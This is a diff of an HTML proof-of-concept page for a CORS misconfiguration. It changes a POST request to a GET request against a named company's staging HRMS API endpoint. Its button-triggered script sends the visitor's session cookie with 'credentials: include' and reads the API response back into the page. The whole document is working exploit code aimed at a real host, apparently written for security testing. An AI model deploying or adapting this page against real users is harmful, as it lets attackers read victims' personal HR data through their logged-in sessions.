@@ -2,27 +2,23 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>CORS Exploit PoC</title>
+  <title>CORS GET PoC</title>
 </head>
 <body>
-  <h2>CORS Exploit PoC</h2>
-  <button onclick="send()">Exploit</button>
+  <h2>CORS GET PoC</h2>
+  <button onclick="exploit()">Exploit</button>
 
   <pre id="output"></pre>
 
   <script>
-    function send() {
-      fetch("https://api.stg.hrms.powerschoolcorp.com/svc/hrms-api/widget/mykeydat", {
-        method: "POST",
+    function exploit() {
+      fetch("https://api.stg.hrms.powerschoolcorp.com/svc/hrms-api/widget/mykeydata", {
+        method: "GET",
         mode: "cors",
-        credentials: "include",
+        credentials: "include", // ensures sid cookie is sent
         headers: {
-          "Content-Type": "text/plain;charset=UTF-8",
           "Accept": "*/*"
-        },
-        body: JSON.stringify({
-          test: "poc"
-        })
+        }
       })
       .then(res => res.text())
       .then(data => {
